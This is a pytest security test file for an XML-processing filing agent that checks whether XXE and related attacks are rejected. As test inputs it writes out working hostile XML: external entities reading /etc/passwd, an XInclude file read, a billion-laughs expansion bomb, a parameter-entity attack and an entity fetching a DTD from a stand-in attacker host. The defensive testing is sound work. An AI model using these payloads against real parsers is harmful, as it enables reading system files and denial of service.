"""
CSRD Automated Filing Agent - Security Tests

Tests for XXE vulnerability prevention in automated filing agent.

Author: GreenLang CSRD Team
Date: 2025-10-20
Version: 1.0.0
"""

import pytest
import zipfile
from pathlib import Path
import tempfile

from agents.domain.automated_filing_agent import (
    CSRDAutomatedFilingAgent,
    create_secure_xml_parser,
    validate_xml_input,
    parse_xml_safely,
)
from lxml import etree


# ============================================================================
# PYTEST FIXTURES
# ============================================================================


@pytest.fixture
def filing_agent():
    """Create automated filing agent instance."""
    return CSRDAutomatedFilingAgent()


@pytest.fixture
def temp_dir():
    """Create temporary directory for test files."""
    with tempfile.TemporaryDirectory() as tmpdir:
        yield Path(tmpdir)


# ============================================================================
# SECURITY TESTS: XXE ATTACK PREVENTION
# ============================================================================


def test_xxe_attack_with_doctype_blocked():
    """Test that XXE attacks with DOCTYPE are blocked."""

    # XXE attack payload with DOCTYPE
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

    # Should raise ValueError about DOCTYPE
    with pytest.raises(ValueError, match="DOCTYPE declarations not allowed"):
        validate_xml_input(xxe_payload)


def test_xxe_attack_with_entity_blocked():
    """Test that XXE attacks with ENTITY declarations are blocked."""

    # XXE attack payload with ENTITY
    xxe_payload = '''<?xml version="1.0"?>
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<root>&xxe;</root>'''

    # Should raise ValueError about ENTITY
    with pytest.raises(ValueError, match="Entity declarations not allowed"):
        validate_xml_input(xxe_payload)


def test_xxe_attack_with_external_reference_blocked():
    """Test that external entity references are blocked."""

    # XXE attack with SYSTEM reference
    xxe_payload = '''<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="file:///etc/passwd" parse="text"/>
</root>'''

    # Should raise ValueError about SYSTEM
    with pytest.raises(ValueError, match="External entity references not allowed"):
        validate_xml_input(xxe_payload)


def test_xxe_billion_laughs_attack_blocked():
    """Test that billion laughs (entity expansion) attack is blocked."""

    # Billion laughs attack payload
    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>'''

    # Should raise ValueError about DOCTYPE or ENTITY
    with pytest.raises(ValueError, match="DOCTYPE declarations not allowed|Entity declarations not allowed"):
        validate_xml_input(xxe_payload)


def test_xxe_size_limit_enforced():
    """Test that XML size limit is enforced to prevent DoS."""

    # Create XML content larger than 10MB (default limit)
    large_xml = '<?xml version="1.0"?><root>' + ('A' * 11 * 1024 * 1024) + '</root>'

    # Should raise ValueError about size
    with pytest.raises(ValueError, match="XML content too large"):
        validate_xml_input(large_xml)


def test_valid_xml_passes_validation():
    """Test that valid XML passes security validation."""

    valid_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<root>
    <element attribute="value">Content</element>
    <another>More content</another>
</root>'''

    # Should not raise any exception
    assert validate_xml_input(valid_xml) is True


def test_parse_xml_safely_with_valid_content():
    """Test that parse_xml_safely works with valid content."""

    valid_xml = '''<?xml version="1.0" encoding="UTF-8"?>
<root>
    <element>Content</element>
</root>'''

    # Should parse successfully
    tree = parse_xml_safely(valid_xml)
    assert tree is not None
    assert tree.tag == 'root'
    assert len(tree) == 1
    assert tree[0].tag == 'element'
    assert tree[0].text == 'Content'


def test_parse_xml_safely_rejects_xxe():
    """Test that parse_xml_safely rejects XXE attacks."""

    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

    # Should raise ValueError
    with pytest.raises(ValueError, match="DOCTYPE declarations not allowed"):
        parse_xml_safely(xxe_payload)


def test_secure_parser_prevents_external_entities():
    """Test that secure parser prevents external entity resolution."""

    parser = create_secure_xml_parser()

    # Verify parser is configured securely
    assert parser is not None
    assert isinstance(parser, etree.XMLParser)

    # Try to parse XXE payload - should fail at validation, not parsing
    xxe_payload = b'''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>'''

    # Even if we bypass validation, parser should be safe
    # (though we don't bypass validation in production)
    # The parser configuration ensures external entities are not resolved
    with pytest.raises((etree.XMLSyntaxError, ValueError)):
        etree.fromstring(xxe_payload, parser)


def test_esef_package_validation_rejects_xxe_in_xhtml(filing_agent, temp_dir):
    """Test that ESEF package validation rejects packages with XXE payloads in XHTML."""

    # Create malicious ESEF package with XXE in XHTML
    malicious_package = temp_dir / "malicious_esef.zip"

    xxe_xhtml = b'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:ix="http://www.xbrl.org/2013/inlineXBRL">
    <head><title>CSRD Report</title></head>
    <body>
        <p>&xxe;</p>
    </body>
</html>'''

    with zipfile.ZipFile(malicious_package, 'w') as zf:
        zf.writestr('META-INF/manifest.xml', '<?xml version="1.0"?><manifest/>')
        zf.writestr('reports/csrd_report.xhtml', xxe_xhtml)

    # Validate package - should detect security violation
    validation = filing_agent.validate_esef_package(malicious_package)

    # Should fail validation
    assert validation['valid'] is False
    assert any('Security validation failed' in str(e) or 'DOCTYPE' in str(e)
               for e in validation['errors'])


def test_esef_package_validation_accepts_safe_xhtml(filing_agent, temp_dir):
    """Test that ESEF package validation accepts safe XHTML without XXE."""

    # Create safe ESEF package
    safe_package = temp_dir / "safe_esef.zip"

    safe_xhtml = b'''<?xml version="1.0" encoding="UTF-8"?>
<html xmlns="http://www.w3.org/1999/xhtml"
      xmlns:ix="http://www.xbrl.org/2013/inlineXBRL">
    <head><title>CSRD Report</title></head>
    <body>
        <p>Safe content without external entities</p>
    </body>
</html>'''

    with zipfile.ZipFile(safe_package, 'w') as zf:
        zf.writestr('META-INF/manifest.xml', '<?xml version="1.0"?><manifest/>')
        zf.writestr('reports/csrd_report.xhtml', safe_xhtml)

    # Validate package - should pass
    validation = filing_agent.validate_esef_package(safe_package)

    # Should pass validation (or only have warnings, not errors)
    if not validation['valid']:
        # If invalid, check it's not due to XXE
        assert not any('Security validation failed' in str(e) for e in validation['errors'])


def test_xml_validation_with_bytes_input():
    """Test XML validation works with bytes input."""

    valid_xml_bytes = b'''<?xml version="1.0" encoding="UTF-8"?>
<root>
    <element>Content</element>
</root>'''

    # Should validate successfully
    assert validate_xml_input(valid_xml_bytes) is True

    # Should also parse successfully
    tree = parse_xml_safely(valid_xml_bytes)
    assert tree is not None
    assert tree.tag == 'root'


def test_xxe_http_external_entity_blocked():
    """Test that HTTP external entity references are blocked."""

    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">
]>
<root>&xxe;</root>'''

    # Should raise ValueError
    with pytest.raises(ValueError, match="DOCTYPE declarations not allowed"):
        validate_xml_input(xxe_payload)


def test_xxe_parameter_entity_attack_blocked():
    """Test that parameter entity attacks are blocked."""

    xxe_payload = '''<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  %xxe;
]>
<root>test</root>'''

    # Should raise ValueError
    with pytest.raises(ValueError, match="DOCTYPE declarations not allowed|Entity declarations not allowed"):
        validate_xml_input(xxe_payload)


def test_large_xml_with_custom_limit():
    """Test that custom size limits work correctly."""

    # Create 6MB XML
    medium_xml = '<?xml version="1.0"?><root>' + ('A' * 6 * 1024 * 1024) + '</root>'

    # Should pass with 10MB limit (default)
    assert validate_xml_input(medium_xml, max_size_mb=10) is True

    # Should fail with 5MB limit
    with pytest.raises(ValueError, match="XML content too large"):
        validate_xml_input(medium_xml, max_size_mb=5)


def test_secure_parser_configuration():
    """Test that secure parser has correct security configuration."""

    parser = create_secure_xml_parser()

    # For lxml, we can check the actual configuration
    # These are the security settings we enforce
    assert hasattr(parser, 'resolvers')

    # The parser should be configured to not resolve entities
    # We can't directly test all settings, but we can verify behavior
    safe_xml = b'<?xml version="1.0"?><root><element>Safe</element></root>'
    tree = etree.fromstring(safe_xml, parser)
    assert tree is not None
